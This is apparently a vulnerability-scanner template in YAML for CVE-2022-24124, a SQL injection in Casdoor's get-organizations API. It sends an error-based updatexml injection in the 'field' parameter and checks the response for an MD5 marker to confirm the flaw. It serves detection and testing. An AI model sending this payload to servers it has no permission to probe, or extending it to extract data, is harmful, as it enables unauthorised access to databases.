name: poc-yaml-casdoor-cve-2022-24124-sqli
binding: 87e586db-76e1-47ab-8bf8-c7f830deb313
manual: true
detail:
    author: Editor
    links:
        - https://www.exploit-db.com/exploits/50792
    vulnerability:
        level: high
transport: http
set:
    rStr0: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,concat('-',md5('{{rStr0}}'),'-'),1)
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(rStr0), 6, 28))
expression: r0()
